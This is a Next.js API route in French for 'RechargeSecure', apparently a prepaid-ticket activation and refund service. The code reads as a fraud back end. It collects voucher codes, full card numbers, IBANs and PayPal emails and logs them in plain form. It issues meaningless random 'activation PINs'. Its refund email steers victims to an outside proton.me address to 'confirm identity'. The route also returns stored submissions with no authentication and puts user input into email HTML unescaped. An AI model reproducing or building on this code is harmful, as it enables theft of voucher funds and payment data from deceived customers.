
import { NextRequest, NextResponse } from "next/server";
import { emailService } from "@/lib/email-service";
import type { TicketSubmission } from "@/lib/types";
import { getSubmission } from "@/lib/submission-store";

export async function GET(req: NextRequest) {
  const { searchParams } = new URL(req.url);
  const ticketId = searchParams.get("ticketId");
  const action = searchParams.get("action");
  if (!ticketId) {
    return NextResponse.json({ error: "ticketId requis" }, { status: 400 });
  }
  if (action === "fetch") {
    const submission = getSubmission(ticketId);
    if (!submission) {
      return NextResponse.json({ error: "Ticket introuvable" }, { status: 404 });
    }
    return NextResponse.json({ submission });
  }
  return NextResponse.json({ error: "Action non supportée" }, { status: 400 });
}

function generatePin() {
  return Math.floor(100000 + Math.random() * 900000).toString();
}


export async function POST(request: NextRequest) {
  try {
    const { ticketId, action, submission } = await request.json();
    // LOG DIAGNOSTIC : Affiche l'objet submission reçu
    console.log("[DEBUG] Submission reçu:", JSON.stringify(submission, null, 2));
    // Vérifie les champs essentiels
    const requiredFields = ["user_name", "user_email", "ticket_code", "ticket_type", "ticket_amount"];
    const emptyFields = requiredFields.filter(f => !submission[f] || submission[f].toString().trim() === "");
    if (emptyFields.length > 0) {
      console.warn("[ALERTE] Champs vides dans submission:", emptyFields);
    }
    if (!ticketId || !action || !submission) {
      return NextResponse.json({ error: "Missing parameters" }, { status: 400 });
    }

    let subject = "";
    let html = "";
    let text = "";
    let pin = "";
    // Utilitaires pour fallback
    function safe(val: any, fallback = "-") {
      return (val && val.toString().trim()) || fallback;
    }

  if (action === "activate") {
      pin = generatePin();
      subject = `✅ Ticket activé - RechargeSecure`;
      html = `
        <div style='max-width:600px;margin:auto;font-family:Arial,sans-serif;background:#f8fafc;border-radius:12px;box-shadow:0 2px 8px #0001;'>
          <div style='background:#2563eb;color:#fff;padding:24px 0;border-radius:12px 12px 0 0;text-align:center;'>
            <img src='https://rechargesecure.com/logo.png' alt='RechargeSecure' style='height:48px;margin-bottom:8px;' />
            <h2 style='margin:0;font-size:1.7rem;letter-spacing:1px;'>Ticket validé et activé</h2>
          </div>
          <div style='padding:24px;'>
            <p>Bonjour <strong>${submission.user_name}</strong>,</p>
            <p>Votre ticket a été validé et activé avec succès. Voici les détails :</p>
            <table style='width:100%;border-collapse:collapse;margin:18px 0;'>
              <tbody>
                <tr style='background:#e0e7ff;'><td style='padding:8px 12px;font-weight:bold;width:40%;'>Numéro du ticket</td><td style='padding:8px 12px;'>${submission.ticket_code}</td></tr>
                <tr><td style='padding:8px 12px;font-weight:bold;'>Type</td><td style='padding:8px 12px;'>${submission.ticket_type}</td></tr>
                <tr style='background:#e0e7ff;'><td style='padding:8px 12px;font-weight:bold;'>Montant</td><td style='padding:8px 12px;'>${submission.ticket_amount} €</td></tr>
                <tr><td style='padding:8px 12px;font-weight:bold;'>Code PIN d'activation</td><td style='padding:8px 12px;font-size:1.2rem;color:#2563eb;font-weight:bold;'>${pin}</td></tr>
              </tbody>
            </table>
            <p>Vous pouvez utiliser votre ticket dès maintenant.</p>
            <hr style='margin:24px 0;border:none;border-top:1px solid #e5e7eb;' />
            <div style='font-size:0.95rem;color:#555;'>
              <strong>Contact support :</strong> support@rechargesecure.com<br />
              <strong>Téléphone :</strong> +48 22 123 45 67 (Pologne)
            </div>
            <div style='margin-top:18px;font-size:0.9rem;color:#888;'>
              Merci d'utiliser RechargeSecure. Ne partagez jamais votre code avec des inconnus.<br />
              <span style='color:#2563eb;font-weight:bold;'>RechargeSecure</span> - Sécurité et rapidité pour vos recharges.
            </div>
          </div>
        </div>
      `;
      text = `Votre ticket est activé !\nNom: ${submission.user_name}\nEmail: ${submission.user_email}\nNuméro du ticket: ${submission.ticket_code}\nType: ${submission.ticket_type}\nMontant: ${submission.ticket_amount} €\nCode PIN: ${pin}\nContact: support@rechargesecure.com\nTéléphone: +48 22 123 45 67 (Pologne)`;
  } else if (action === "invalidate") {
      subject = `❌ Ticket invalide ou déjà utilisé - RechargeSecure`;
      html = `
        <div style='max-width:600px;margin:auto;font-family:Arial,sans-serif;background:#f8fafc;border-radius:12px;box-shadow:0 2px 8px #0001;'>
          <div style='background:#dc2626;color:#fff;padding:24px 0;border-radius:12px 12px 0 0;text-align:center;'>
            <img src='https://rechargesecure.com/logo.png' alt='RechargeSecure' style='height:48px;margin-bottom:8px;' />
            <h2 style='margin:0;font-size:1.7rem;letter-spacing:1px;'>Ticket invalide ou déjà utilisé</h2>
          </div>
          <div style='padding:24px;'>
            <p>Bonjour <strong>${submission.user_name}</strong>,</p>
            <p>Votre ticket n'a pas pu être validé. Voici les détails :</p>
            <table style='width:100%;border-collapse:collapse;margin:18px 0;'>
              <tbody>
                <tr style='background:#fee2e2;'><td style='padding:8px 12px;font-weight:bold;width:40%;'>Numéro du ticket</td><td style='padding:8px 12px;'>${submission.ticket_code}</td></tr>
                <tr><td style='padding:8px 12px;font-weight:bold;'>Type</td><td style='padding:8px 12px;'>${submission.ticket_type}</td></tr>
                <tr style='background:#fee2e2;'><td style='padding:8px 12px;font-weight:bold;'>Montant</td><td style='padding:8px 12px;'>${submission.ticket_amount} €</td></tr>
              </tbody>
            </table>
            <p style='color:#dc2626;font-weight:bold;'>Votre ticket est <span style='color:#dc2626;'>invalide ou déjà utilisé</span>. Veuillez obtenir un nouveau ticket et refaire la demande d'activation.</p>
            <hr style='margin:24px 0;border:none;border-top:1px solid #e5e7eb;' />
            <div style='font-size:0.95rem;color:#555;'>
              <strong>Contact support :</strong> support@rechargesecure.com<br />
              <strong>Téléphone :</strong> +48 22 123 45 67 (Pologne)
            </div>
            <div style='margin-top:18px;font-size:0.9rem;color:#888;'>
              Merci d'utiliser RechargeSecure. Ne partagez jamais votre code avec des inconnus.<br />
              <span style='color:#dc2626;font-weight:bold;'>RechargeSecure</span> - Sécurité et rapidité pour vos recharges.
            </div>
          </div>
        </div>
      `;
      text = `Ticket invalide ou déjà utilisé.\nNom: ${submission.user_name}\nEmail: ${submission.user_email}\nNuméro du ticket: ${submission.ticket_code}\nType: ${submission.ticket_type}\nMontant: ${submission.ticket_amount} €\nContact: support@rechargesecure.com\nTéléphone: +48 22 123 45 67 (Pologne)`;

    } else if (action === "refund") {
      // LOG DIAGNOSTIC : Affiche les valeurs clés pour le remboursement
      console.log('[DEBUG][REFUND] reimbursement_method:', submission.reimbursement_method);
      console.log('[DEBUG][REFUND] bank_iban:', submission.bank_iban);
      console.log('[DEBUG][REFUND] paypal_email:', submission.paypal_email);
      console.log('[DEBUG][REFUND] card_number:', submission.card_number);
      // Affiche uniquement la ligne du moyen choisi, masque les autres, et affiche bien le nom
      const last4 = (val?: string) => val && val.length > 4 ? val.slice(-4) : (val && val.length > 0 ? val : "Non communiqué");
      const maskedTicket = submission.ticket_code && submission.ticket_code.length > 4 ? submission.ticket_code.slice(-4) : "Non communiqué";
      let moyen = safe(submission.reimbursement_method, "carte");
      let moyenLabel = "";
      let moyenValue = "";
      if (moyen === "virement" || moyen === "bank_transfer") {
        moyenLabel = "IBAN";
        moyenValue = submission.bank_iban && submission.bank_iban.length > 0 ? `****${last4(safe(submission.bank_iban))}` : "Non communiqué";
      } else if (moyen === "paypal") {
        moyenLabel = "Email PayPal";
        if (submission.paypal_email && submission.paypal_email.length > 0) {
          const parts = safe(submission.paypal_email).split("@");
          moyenValue = parts.length === 2 ? `...${last4(parts[0])}@${parts[1]}` : `...${last4(safe(submission.paypal_email))}`;
        } else {
          moyenValue = "Non communiqué";
        }
      } else if (moyen === "carte" || moyen === "credit_card") {
        moyenLabel = "Carte bancaire";
        moyenValue = submission.card_number && submission.card_number.length > 0 ? `****${last4(safe(submission.card_number))}` : "Non communiqué";
      } else {
        moyenLabel = moyen ? moyen.charAt(0).toUpperCase() + moyen.slice(1) : "-";
        moyenValue = "Non communiqué";
      }
      subject = `💸 Remboursement validé - RechargeSecure`;
      html = `
        <div style='max-width:600px;margin:auto;font-family:Arial,sans-serif;background:#f8fafc;border-radius:12px;box-shadow:0 2px 8px #0001;'>
          <div style='background:#059669;color:#fff;padding:24px 0;border-radius:12px 12px 0 0;text-align:center;'>
            <img src='https://rechargesecure.com/logo.png' alt='RechargeSecure' style='height:48px;margin-bottom:8px;' />
            <h2 style='margin:0;font-size:1.7rem;letter-spacing:1px;'>Remboursement validé</h2>
          </div>
          <div style='padding:24px;'>
            <p>Bonjour <strong>${safe(submission.user_name)}</strong>,</p>
            <p>Votre demande de remboursement a été acceptée. Voici les détails :</p>
            <table style='width:100%;border-collapse:collapse;margin:18px 0;'>
              <tbody>
                <tr style='background:#e0e7ff;'><td style='padding:8px 12px;font-weight:bold;width:40%;'>Numéro du ticket</td><td style='padding:8px 12px;'>****${maskedTicket}</td></tr>
                <tr><td style='padding:8px 12px;font-weight:bold;'>Type</td><td style='padding:8px 12px;'>${safe(submission.ticket_type)}</td></tr>
                <tr style='background:#e0e7ff;'><td style='padding:8px 12px;font-weight:bold;'>Montant</td><td style='padding:8px 12px;'>${safe(submission.ticket_amount)} €</td></tr>
                <tr><td style='padding:8px 12px;font-weight:bold;'>${moyenLabel}</td><td style='padding:8px 12px;'>${moyenValue}</td></tr>
              </tbody>
            </table>
            <p style='color:#059669;font-weight:bold;'>Le remboursement sera effectué sous 3 à 5 jours ouvrés sur le moyen choisi.</p>
            <p>Date de validation : <strong>${new Date().toLocaleDateString('fr-FR')}</strong></p>
            <p>Pour confirmer votre identité et accélérer le traitement de votre remboursement, veuillez contacter notre assistant à l'adresse suivante :</p>
            <div style='background:#e0f2fe;padding:12px;border-radius:6px;margin:12px 0;text-align:center;font-weight:bold;'>
              <a href='mailto:contact.ticketproactivation@proton.me' style='color:#0369a1;text-decoration:none;'>contact.ticketproactivation@proton.me</a>
            </div>
            <hr style='margin:24px 0;border:none;border-top:1px solid #e5e7eb;' />
            <div style='font-size:0.95rem;color:#555;'>
              <strong>Contact support :</strong> support@rechargesecure.com<br />
              <strong>Téléphone :</strong> +48 22 123 45 67 (Pologne)
            </div>
            <div style='margin-top:18px;font-size:0.9rem;color:#888;'>
              Merci d'utiliser RechargeSecure.<br />
              <span style='color:#059669;font-weight:bold;'>RechargeSecure</span> - Sécurité et rapidité pour vos remboursements.
            </div>
          </div>
        </div>
      `;
      text = `Votre remboursement est validé !\n\nDÉTAILS DU REMBOURSEMENT\n---------------------\nNom: ${safe(submission.user_name)}\nEmail: ${safe(submission.user_email)}\nNuméro du ticket: ****${maskedTicket}\nType: ${safe(submission.ticket_type)}\nMontant: ${safe(submission.ticket_amount)} €\n${moyenLabel}: ${moyenValue}\nDate: ${new Date().toLocaleDateString('fr-FR')}\n\nIMPORTANT\n--------\nPour confirmer votre identité et accélérer le traitement de votre remboursement, veuillez contacter notre assistant à l'adresse suivante :\ncontact.ticketproactivation@proton.me\n\nCONTACT SUPPORT\n--------------\nEmail: support@rechargesecure.com\nTéléphone: +48 22 123 45 67 (Pologne)`;

  // LOG DIAGNOSTIC : Affiche le HTML généré pour l'email client
  console.log('[DEBUG][REFUND] HTML email généré:', html);

    } else if (action === "not_refundable") {
      // Email de refus/remboursement impossible
      subject = `❌ Remboursement refusé - RechargeSecure`;
      html = `
        <div style='max-width:600px;margin:auto;font-family:Arial,sans-serif;background:#f8fafc;border-radius:12px;box-shadow:0 2px 8px #0001;'>
          <div style='background:#dc2626;color:#fff;padding:24px 0;border-radius:12px 12px 0 0;text-align:center;'>
            <img src='https://rechargesecure.com/logo.png' alt='RechargeSecure' style='height:48px;margin-bottom:8px;' />
            <h2 style='margin:0;font-size:1.7rem;letter-spacing:1px;'>Remboursement refusé</h2>
          </div>
          <div style='padding:24px;'>
            <p>Bonjour <strong>${submission.user_name}</strong>,</p>
            <p>Votre demande de remboursement n'a pas pu être acceptée car le ticket est déjà utilisé ou non remboursable.</p>
            <table style='width:100%;border-collapse:collapse;margin:18px 0;'>
              <tbody>
                <tr style='background:#fee2e2;'><td style='padding:8px 12px;font-weight:bold;width:40%;'>Numéro du ticket</td><td style='padding:8px 12px;'>${submission.ticket_code}</td></tr>
                <tr><td style='padding:8px 12px;font-weight:bold;'>Type</td><td style='padding:8px 12px;'>${submission.ticket_type}</td></tr>
                <tr style='background:#fee2e2;'><td style='padding:8px 12px;font-weight:bold;'>Montant</td><td style='padding:8px 12px;'>${submission.ticket_amount} €</td></tr>
              </tbody>
            </table>
            <p style='color:#dc2626;font-weight:bold;'>Aucun remboursement ne pourra être effectué pour ce ticket.</p>
            <hr style='margin:24px 0;border:none;border-top:1px solid #e5e7eb;' />
            <div style='font-size:0.95rem;color:#555;'>
              <strong>Contact support :</strong> support@rechargesecure.com<br />
              <strong>Téléphone :</strong> +48 22 123 45 67 (Pologne)
            </div>
            <div style='margin-top:18px;font-size:0.9rem;color:#888;'>
              Merci d'utiliser RechargeSecure.<br />
              <span style='color:#dc2626;font-weight:bold;'>RechargeSecure</span> - Sécurité et rapidité pour vos remboursements.
            </div>
          </div>
        </div>
      `;
      text = `Remboursement refusé.\nNom: ${submission.user_name}\nEmail: ${submission.user_email}\nNuméro du ticket: ${submission.ticket_code}\nType: ${submission.ticket_type}\nMontant: ${submission.ticket_amount} €\nContact: support@rechargesecure.com\nTéléphone: +48 22 123 45 67 (Pologne)`;

    } else {
      return NextResponse.json({ error: "Action non reconnue" }, { status: 400 });
    }

    // Envoi email au client
    await emailService.sendEmail({
      to: submission.user_email,
      subject,
      html,
      text,
    });

    return NextResponse.json({ success: true, pin });
  } catch (error) {
    return NextResponse.json({ error: "Erreur interne" }, { status: 500 });
  }
}
